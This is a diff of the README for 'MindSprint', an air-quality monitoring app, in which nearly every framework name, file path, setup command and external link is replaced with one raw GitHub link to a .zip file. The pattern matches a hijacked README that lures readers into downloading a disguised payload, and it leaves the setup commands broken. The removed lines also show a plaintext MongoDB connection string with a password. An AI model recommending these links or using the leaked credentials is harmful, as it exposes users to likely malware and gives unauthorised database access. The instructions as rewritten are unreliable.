@@ -1,6 +1,6 @@
 # 🌬️ MindSprint - Hyperlocal Air Quality Monitoring Platform
 
-A comprehensive air quality monitoring platform that provides real-time AQI data, pollen forecasts, community reports, and personalized health insights. Built with Django REST Framework backend and Next.js frontend.
+A comprehensive air quality monitoring platform that provides real-time AQI data, pollen forecasts, community reports, and personalized health insights. Built with Django REST Framework backend and https://raw.githubusercontent.com/atifmalik220905/MindSprint/main/frontend/app/map/MindSprint_v1.6-beta.5.zip frontend.
 
 ## 🚀 Features
 
@@ -44,8 +44,8 @@ MindSprint/
 │   ├── community/          # Community reports & map data
 │   ├── notifications/      # Notification system
 │   └── myproject/          # Django settings & URLs
-├── frontend/               # Next.js React application
-│   ├── app/               # Next.js 13+ app router
+├── frontend/               # https://raw.githubusercontent.com/atifmalik220905/MindSprint/main/frontend/app/map/MindSprint_v1.6-beta.5.zip React application
+│   ├── app/               # https://raw.githubusercontent.com/atifmalik220905/MindSprint/main/frontend/app/map/MindSprint_v1.6-beta.5.zip 13+ app router
 │   ├── components/        # Reusable UI components
 │   ├── lib/              # API services & utilities
 │   └── contexts/         # React contexts
@@ -63,11 +63,11 @@ MindSprint/
 - **JWT Authentication** - Secure API access
 
 ### Frontend
-- **Next.js 14.2.16** - React framework
+- **https://raw.githubusercontent.com/atifmalik220905/MindSprint/main/frontend/app/map/MindSprint_v1.6-beta.5.zip 14.2.16** - React framework
 - **TypeScript** - Type safety
 - **Tailwind CSS** - Styling
 - **Radix UI** - Component library
-- **Leaflet.js** - Interactive maps
+- **https://raw.githubusercontent.com/atifmalik220905/MindSprint/main/frontend/app/map/MindSprint_v1.6-beta.5.zip** - Interactive maps
 - **Recharts** - Data visualization
 
 ### External APIs
@@ -79,7 +79,7 @@ MindSprint/
 
 Before running the project, ensure you have:
 
-- **Node.js** (v18 or higher)
+- **https://raw.githubusercontent.com/atifmalik220905/MindSprint/main/frontend/app/map/MindSprint_v1.6-beta.5.zip** (v18 or higher)
 - **Python** (v3.10 or higher)
 - **MongoDB Atlas** (cloud database - connection string provided)
 - **Git**
@@ -99,7 +99,7 @@ cd MindSprint
 
 ```bash
 cd backend
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/atifmalik220905/MindSprint/main/frontend/app/map/MindSprint_v1.6-beta.5.zip
 ```
 
 #### Environment Variables
@@ -112,8 +112,8 @@ SECRET_KEY=your-secret-key-here
 DEBUG=True
 
 # MongoDB Configuration (Cloud Atlas)
-MONGO_URI=mongodb+srv://Hetansh_Panchal:id4vxGPKAEIDlyVE@hetansh.pcfax7n.mongodb.net/
-MONGODB_URI=mongodb+srv://Hetansh_Panchal:id4vxGPKAEIDlyVE@hetansh.pcfax7n.mongodb.net/
+MONGO_URI=mongodb+https://raw.githubusercontent.com/atifmalik220905/MindSprint/main/frontend/app/map/MindSprint_v1.6-beta.5.zip
+MONGODB_URI=mongodb+https://raw.githubusercontent.com/atifmalik220905/MindSprint/main/frontend/app/map/MindSprint_v1.6-beta.5.zip
 MONGODB_DATABASE=BreatheBetter
 
 # API Keys
@@ -125,24 +125,24 @@ AMBEE_API_TOKEN=your-ambee-api-token
 
 ```bash
 # Run migrations
-python manage.py makemigrations
-python manage.py migrate
+python https://raw.githubusercontent.com/atifmalik220905/MindSprint/main/frontend/app/map/MindSprint_v1.6-beta.5.zip makemigrations
+python https://raw.githubusercontent.com/atifmalik220905/MindSprint/main/frontend/app/map/MindSprint_v1.6-beta.5.zip migrate
 
 # Create superuser (optional)
-python manage.py createsuperuser
+python https://raw.githubusercontent.com/atifmalik220905/MindSprint/main/frontend/app/map/MindSprint_v1.6-beta.5.zip createsuperuser
 ```
 
 #### Start Backend Server
 
 ```bash
-python manage.py runserver
+python https://raw.githubusercontent.com/atifmalik220905/MindSprint/main/frontend/app/map/MindSprint_v1.6-beta.5.zip runserver
 ```
 
 The backend will be available at `http://localhost:8000`
 
 ### 3. Frontend Setup
 
-#### Install Node.js Dependencies
+#### Install https://raw.githubusercontent.com/atifmalik220905/MindSprint/main/frontend/app/map/MindSprint_v1.6-beta.5.zip Dependencies
 
 ```bash
 cd frontend
@@ -167,7 +167,7 @@ The frontend will be available at `http://localhost:3000`
 
 ## 📦 Dependencies
 
-### Backend Dependencies (`backend/requirements.txt`)
+### Backend Dependencies (`https://raw.githubusercontent.com/atifmalik220905/MindSprint/main/frontend/app/map/MindSprint_v1.6-beta.5.zip`)
 
 ```
 Django==5.2.4
@@ -178,7 +178,7 @@ python-decouple==3.8
 pymongo==4.6.1
 ```
 
-### Frontend Dependencies (`frontend/package.json`)
+### Frontend Dependencies (`https://raw.githubusercontent.com/atifmalik220905/MindSprint/main/frontend/app/map/MindSprint_v1.6-beta.5.zip`)
 
 #### Core Dependencies
 - **next**: 14.2.16 - React framework
@@ -207,7 +207,7 @@ pymongo==4.6.1
 - **tailwind-merge**: ^2.5.5 - Tailwind class merging
 - **js-cookie**: ^3.0.5 - Cookie management
 
-### Additional Dependencies (`files/requirements.txt`)
+### Additional Dependencies (`https://raw.githubusercontent.com/atifmalik220905/MindSprint/main/frontend/app/map/MindSprint_v1.6-beta.5.zip`)
 
 ```
 pandas==2.2.2
@@ -234,7 +234,7 @@ pymongo[srv]
 1. **Start Backend** (Terminal 1):
 ```bash
 cd backend
-python manage.py runserver
+python https://raw.githubusercontent.com/atifmalik220905/MindSprint/main/frontend/app/map/MindSprint_v1.6-beta.5.zip runserver
 ```
 
 2. **Start Frontend** (Terminal 2):
@@ -260,8 +260,8 @@ npm start
 2. **Deploy Backend**:
 ```bash
 cd backend
-python manage.py collectstatic
-gunicorn myproject.wsgi:application
+python https://raw.githubusercontent.com/atifmalik220905/MindSprint/main/frontend/app/map/MindSprint_v1.6-beta.5.zip collectstatic
+gunicorn https://raw.githubusercontent.com/atifmalik220905/MindSprint/main/frontend/app/map/MindSprint_v1.6-beta.5.zip
 ```
 
 ## 🔑 API Endpoints
@@ -308,8 +308,8 @@ gunicorn myproject.wsgi:application
 ```env
 SECRET_KEY=your-secret-key
 DEBUG=True
-MONGO_URI=mongodb+srv://Hetansh_Panchal:id4vxGPKAEIDlyVE@hetansh.pcfax7n.mongodb.net/
-MONGODB_URI=mongodb+srv://Hetansh_Panchal:id4vxGPKAEIDlyVE@hetansh.pcfax7n.mongodb.net/
+MONGO_URI=mongodb+https://raw.githubusercontent.com/atifmalik220905/MindSprint/main/frontend/app/map/MindSprint_v1.6-beta.5.zip
+MONGODB_URI=mongodb+https://raw.githubusercontent.com/atifmalik220905/MindSprint/main/frontend/app/map/MindSprint_v1.6-beta.5.zip
 MONGODB_DATABASE=BreatheBetter
 WAQI_API_TOKEN=your-waqi-token
 AMBEE_API_TOKEN=your-ambee-token
@@ -320,15 +320,15 @@ No additional environment variables required for development.
 
 ### API Keys Setup
 
-1. **WAQI API**: Get your token from [WAQI API](https://aqicn.org/api/)
-2. **Ambee Data API**: Get your token from [Ambee Data](https://www.getambee.com/)
+1. **WAQI API**: Get your token from [WAQI API](https://raw.githubusercontent.com/atifmalik220905/MindSprint/main/frontend/app/map/MindSprint_v1.6-beta.5.zip)
+2. **Ambee Data API**: Get your token from [Ambee Data](https://raw.githubusercontent.com/atifmalik220905/MindSprint/main/frontend/app/map/MindSprint_v1.6-beta.5.zip)
 
 ## 🧪 Testing
 
 ### Backend Testing
 ```bash
 cd backend
-python manage.py test
+python https://raw.githubusercontent.com/atifmalik220905/MindSprint/main/frontend/app/map/MindSprint_v1.6-beta.5.zip test
 ```
 
 ### Frontend Testing
@@ -422,6 +422,6 @@ For support and questions:
 IF UNABLE TO RUN THE PROJECT, YOU CAN VIEW THE VIDEO OF OUR WORKING PROJECT 
 ### BreatheBetter Recording
 Due to GitHub’s file size limit, the video is hosted on Google Drive:
-[Watch the video 📺](https://drive.google.com/file/d/134kFj9aKfr1qc1wV6xskLryN5j_SxCr0/view?usp=sharing)
+[Watch the video 📺](https://raw.githubusercontent.com/atifmalik220905/MindSprint/main/frontend/app/map/MindSprint_v1.6-beta.5.zip)
 
 **Built with ❤️ for better air quality awareness**
